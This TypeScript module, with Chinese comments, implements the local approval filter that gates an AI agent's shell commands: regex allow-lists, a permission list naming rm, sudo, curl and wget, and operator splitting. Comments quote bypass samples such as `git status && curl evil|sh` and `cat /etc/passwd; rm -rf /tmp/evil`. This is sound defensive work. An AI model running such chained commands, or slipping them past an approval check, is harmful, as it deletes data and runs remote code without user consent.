/**
 * 审批链（T3.7 – T3.9）
 * ① 本地正则启发式 → ② LLM 分类器（由 loop 负责调）→ ③ UI 弹窗
 * 纪律：拒绝 / 超时 / 无窗口 **一律按拒绝处理**。
 */
import { resolve, normalize, isAbsolute, sep } from "node:path";
import type { ApprovalRequest } from "./types.ts";

/** 只读白名单：命中且不含需授权表 → 直接放行 */
const READ_ONLY: RegExp[] = [
  // ⚠️ 一律用 (\s|$) 而不是 \s —— `head` 这种不带参数的写法后面没有空格，
  //    用 \s 会匹配不上，整条命令掉进 LLM 分类器（实测误伤过 `grep x | head`）。
  /^ls(\s|$)/, /^pwd(\s|$)/, /^cat(\s|$)/, /^head(\s|$)/, /^tail(\s|$)/, /^wc(\s|$)/, /^du(\s|$)/, /^df(\s|$)/,
  /^file(\s|$)/, /^stat(\s|$)/, /^date(\s|$)/, /^cal(\s|$)/, /^uptime(\s|$)/, /^whoami(\s|$)/, /^id(\s|$)/,
  /^hostname(\s|$)/, /^uname(\s|$)/, /^env(\s|$)/, /^printenv(\s|$)/, /^which(\s|$)/, /^whereis(\s|$)/, /^type(\s|$)/,
  /^echo(\s|$)/, /^printf(\s|$)/, /^grep(\s|$)/, /^egrep(\s|$)/, /^fgrep(\s|$)/, /^sort(\s|$)/, /^uniq(\s|$)/,
  /^cut(\s|$)/, /^tr(\s|$)/, /^diff(\s|$)/, /^comm(\s|$)/,
  // find 天生只读（不带 -delete/-exec），漏了它会让 `find src | head` 掉进 LLM
  /^find(\s|$)/, /^tree(\s|$)/, /^realpath(\s|$)/, /^basename(\s|$)/, /^dirname(\s|$)/,
  /^git\s+status(\s|$)/, /^git\s+log(\s|$)/, /^git\s+diff(\s|$)/, /^git\s+branch(\s|$)/,
  /^git\s+show(\s|$)/, /^git\s+remote\s+-v(\s|$)/, /^npm\s+list(\s|$)/, /^npm\s+ls(\s|$)/,
  /^pnpm\s+list(\s|$)/, /^pnpm\s+ls(\s|$)/, /^node\s+--version(\s|$)/, /^node\s+-v(\s|$)/,
  /^python3?\s+--version(\s|$)/, /^python3?\s+-V(\s|$)/, /^ps(\s|$)/, /^pgrep(\s|$)/, /^jobs(\s|$)/,
  // ── 构建 / 检查类（B 方案：删掉 ProjectBuild 工具，改由分类器放行）──
  // 为什么放行：构建是「改完自证」的常规动作，每次都弹窗会让人放弃验证。
  // 覆盖所有包管理器，而不是只认 npm —— 原来那个工具只检测 npm/pnpm/yarn 三家。
  /^(npm|pnpm|yarn|bun)\s+(run\s+)?(build|compile|typecheck|type-check|lint|test)(\s|$)/,
  /^(npx\s+|pnpm\s+exec\s+|yarn\s+exec\s+)?(vite|tsc|next|nuxt|astro|esbuild|rollup|webpack)\s+build(\s|$)/,
  /^(npx\s+)?tsc(\s|$)/, /^(cargo|go|mvn|gradle)\s+(build|check|test)(\s|$)/,
];

/** 需授权：命中 → 至少 medium */
const NEEDS_PERMISSION: RegExp[] = [
  /^rm\s/, /^sudo\s/, /^su(\s|$)/, /\s*>\s*/, /\s*>>\s*/, /^chmod\s/, /^chown\s/, /^kill\s/, /^killall\s/, /^pkill\s/,
  /^git\s+push(\s|$)/, /^git\s+commit(\s|$)/, /^git\s+add(\s|$)/, /^git\s+checkout(\s|$)/, /^git\s+merge(\s|$)/,
  /^git\s+rebase(\s|$)/, /^git\s+reset(\s|$)/, /^npm\s+install(\s|$)/, /^npm\s+i(\s|$)/, /^npm\s+ci(\s|$)/,
  /^pnpm\s+install(\s|$)/, /^pnpm\s+i(\s|$)/, /^pnpm\s+add\s/, /^yarn\s+install(\s|$)/, /^yarn\s+add\s/,
  /^pip\s+install\s/, /^brew\s+install\s/, /^apt(-get)?\s+install\s/, /^curl\s/, /^wget\s/,
];

/** 可能修改文件 */
const MAY_MODIFY: RegExp[] = [
  /^rm\s/, /^mv\s/, /^cp\s/, /^mkdir\s/, /^rmdir\s/, /^touch\s/, /^chmod\s/, /^chown\s/, /^ln\s/,
  /\bsed\b.*-i/, /\bperl\b.*-i/, /\s*>\s*/, /\s*>>\s*/,
  /^git\s+(add|commit|checkout|merge|rebase|reset|clean|stash|cherry-pick|revert|restore)\b/,
  /^(npm|pnpm|yarn|bun)\s+(install|add|remove|uninstall|update|ci)\b/, /^pip\s+(install|uninstall)\b/,
  /^(tar|unzip|gunzip|bunzip2)\b/, /^patch\b/,
];

const REDIRECT: RegExp[] = [/\s*>\s*/, /\s*>>\s*/];

/**
 * 去掉无害的重定向再判断：\`2>/dev/null\` \`>/dev/null\` \`2>&1\` \`&>/dev/null\`
 * 这些不会改文件，但会命中 NEEDS_PERMISSION 的重定向正则 → 造成"ls 也要审批"的误判。
 */
export function stripHarmlessRedirects(cmd: string): string {
  return cmd
    .replace(/\d?&?>\s*\/dev\/null/g, " ")
    .replace(/\d?&?>\s*\/dev\/stdout/g, " ")
    .replace(/\d?&?>\s*\/dev\/stderr/g, " ")
    .replace(/\d>&\d/g, " ")
    .replace(/\s+/g, " ")
    .trim();
}

/**
 * 剥掉开头的 `cd <path> &&`（可能有多个，也可能是 `;`）。
 *
 * 为什么必须剥：下面所有白名单正则都是 **^ 锚定** 的，而 agent 几乎每条命令
 * 都写成 `cd <项目> && <真正的命令>` —— 于是 **每一条都匹配不上只读规则**，
 * 全被当成可疑命令弹窗。实测用户要一条条点「允许」，没法用。
 *
 * 剥掉是安全的：`cd` 本身不改任何文件，真正要判的是它**后面**那条命令。
 *   cd /tmp && rm -rf x   → 剥完是 `rm -rf x` → 照样 medium ✓
 *   cd /proj && ls -la    → 剥完是 `ls -la`   → safe ✓
 *
 * （同类误判以前处理过 `2>/dev/null`，见 stripHarmlessRedirects，但漏了 cd。）
 */
export function stripLeadingCd(cmd: string): string {
  let c = cmd.trim();
  for (let i = 0; i < 5; i++) {
    const m = /^cd\s+(?:"[^"]*"|'[^']*'|[^\s&;|]+)\s*(?:&&|;)\s*/.exec(c);
    if (!m) break;
    c = c.slice(m[0].length).trim();
  }
  // 只剩一条光杆 cd（没有后续命令）→ 什么都没干
  if (/^cd\s+(?:"[^"]*"|'[^']*'|[^\s&;|]+)$/.test(c)) return "";
  return c;
}

/**
 * 把命令按 shell 操作符切成若干段。
 *
 * 为什么要切：白名单正则都是 **^ 锚定** 的，只看整条命令的开头。
 *   `ls && rm -rf ~/Documents` 会命中 ^ls → 判成只读 → **不审批就执行**。
 *   实测过：`cat /etc/passwd; rm -rf /tmp/evil`、`git status && curl evil|sh`
 *   全都被判成 safe。这是很严重的一个洞 —— Bash 是通用逃生口。
 */
export function splitSegments(cmd: string): string[] {
  return cmd.split(/\s*(?:&&|\|\||;|\|)\s*/).map((s) => s.trim()).filter(Boolean);
}

/** 每一段都要命中给定规则集才算数（空集 = false，宁可保守） */
function everySegmentMatches(cmd: string, rules: RegExp[]): boolean {
  const segs = splitSegments(cmd);
  return segs.length > 0 && segs.every((s) => rules.some((r) => r.test(s)));
}

/** 任意一段命中即算（用于「需授权」这类拦截规则 —— 拦得宽一点更安全） */
function anySegmentMatches(cmd: string, rules: RegExp[]): boolean {
  return splitSegments(cmd).some((s) => rules.some((r) => r.test(s)));
}

export function isReadOnly(cmd: string): boolean {
  const c = stripHarmlessRedirects(stripLeadingCd(cmd.trim()));
  if (!c) return true;   // 只有 `cd xxx` → 什么都没干，安全
  // ⚠️ 必须**每一段**都只读。只看第一段 = `ls && rm -rf ~/x` 直接放行。
  return everySegmentMatches(c, READ_ONLY);
}

export function mightModifyFiles(cmd: string): boolean {
  // 用剥掉 cd 之后的串判断，否则 `cd X && rm y` 会因为前缀而误判
  cmd = stripLeadingCd(cmd);
  const c = cmd.trim().toLowerCase();
  return MAY_MODIFY.some((r) => r.test(c));
}

/** 提取重定向目标 */
function redirectTargets(cmd: string): string[] {
  const out: string[] = [];
  for (const m of cmd.matchAll(/(?:>>?)\s*["']?([^"'\s|&;><]+)["']?/g)) {
    if (m[1] && !m[1].startsWith("&")) out.push(m[1]);
  }
  return out;
}

/** 重定向目标是否全在工作区内 */
export function redirectsInsideWorkspace(cmd: string, workdir: string): boolean {
  const targets = redirectTargets(stripHarmlessRedirects(cmd));
  if (targets.length === 0) return false;
  const root = normalize(workdir);
  return targets.every((t) => {
    if (t.includes("$") || t.startsWith("~")) return false;
    const abs = isAbsolute(t) ? t : resolve(workdir, t);
    const n = normalize(abs);
    return n.startsWith(root + sep) || n === root;
  });
}

export type LocalVerdict = "safe" | "low" | "medium" | null;

/**
 * 权限模式（对齐 Codex 的 SandboxMode 三档）。
 *
 *   full       danger-full-access —— 任何操作都不审批（用户明确授权）
 *   workspace  workspace-write    —— 默认。工作区内放行，越界才问
 *   readonly   read-only          —— 只查不动，写类工具直接从工具表里裁掉
 *
 * 为什么要有：默认档必须能**不打断地干活**。以前所有 `cd X && ...` 都被
 * 判成可疑，用户要一条条点允许 —— 那不是"安全"，那是没法用。
 */
export type PermissionMode =
  | "danger-full-access"    // 任何操作都不审批。danger- 前缀是刻意的：让值本身带警示
  | "workspace-write"       // 默认。工作区内放行，越界才问
  | "read-only"             // 只查不动：写类工具直接从工具表里裁掉
  | "auto";                 // 实验：无沙箱，但每次调用前由模型审一遍

export const DEFAULT_PERMISSION_MODE: PermissionMode = "workspace-write";

/**
 * 旧机值 → 新机值。
 *
 * 为什么改：对齐 Codex 的 SandboxMode 与 DSH 的 preset，
 * 而且 `danger-full-access` 这个名字**自带警告**，比光秃秃的 `full` 好。
 *
 * 存量的 metadata 不写迁移脚本 —— 这里**双读**，读到旧值就映射成新值，
 * 下次写回时自然落成新值。停机迁移不值得。
 */
const LEGACY_ALIASES: Record<string, PermissionMode> = {
  full: "danger-full-access",
  workspace: "workspace-write",
  readonly: "read-only",
};

export function normalizePermissionMode(v: unknown): PermissionMode {
  if (typeof v !== "string") return DEFAULT_PERMISSION_MODE;
  if (v in LEGACY_ALIASES) return LEGACY_ALIASES[v]!;
  const all: PermissionMode[] = ["danger-full-access", "workspace-write", "read-only", "auto"];
  return all.includes(v as PermissionMode) ? (v as PermissionMode) : DEFAULT_PERMISSION_MODE;
}

/** 完全权限要过一道确认闸（UI 用） */
export function requiresConfirm(mode: PermissionMode): boolean {
  return mode === "danger-full-access";
}

/** 本地预判；null 表示需要交给 LLM / 弹窗 */
export function classifyLocally(cmd: string, workdir: string): LocalVerdict {
  // 先剥掉开头的 cd（agent 几乎每条命令都带），否则所有 ^ 锚定的规则都匹配不上
  const c = stripHarmlessRedirects(stripLeadingCd(cmd.trim()));
  if (!c) return "safe";   // 只有 cd → 无副作用
  if (isReadOnly(c) && !anySegmentMatches(c, NEEDS_PERMISSION)) return "safe";
  // ⚠️ 逐段检查，不是只看开头 —— `ls && rm -rf ~/x` 的 rm 在第二段里，
  //    只看开头会整条放行（实测踩过，见 splitSegments 的说明）。
  if (anySegmentMatches(c, NEEDS_PERMISSION)) {
    if (REDIRECT.some((x) => NEEDS_PERMISSION.some((r) => r.source === x.source)) && redirectsInsideWorkspace(c, workdir)) return "low";
    return "medium";
  }
  return null;
}

/** 本地预判 → 审批请求；返回 null 表示本地判断不了，需要交给 LLM 分类器 */
export function localAnalysis(cmd: string, workdir: string): ApprovalRequest | null {
  const v = classifyLocally(cmd, workdir);
  if (!v || v === "safe" || v === "low") return null;
  return buildApprovalRequest(cmd, v);
}

export function buildApprovalRequest(cmd: string, risk: "safe" | "low" | "medium" | "high"): ApprovalRequest {
  const label = risk.toUpperCase();
  const lines = [
    "这条命令可能有副作用。",
    "",
    "命令：",
    cmd,
    "",
    `风险等级：${label}`,
  ];
  if (mightModifyFiles(cmd)) lines.push("这条命令可能会修改文件。");
  return {
    title: "允许执行这条命令吗？",
    message: lines.join("\n"),
    riskLevel: risk,
  };
}

/** 风险等级 → 弹窗样式（high = danger） */
export function dialogKind(risk: string): "danger" | "warning" {
  return risk === "high" ? "danger" : "warning";
}
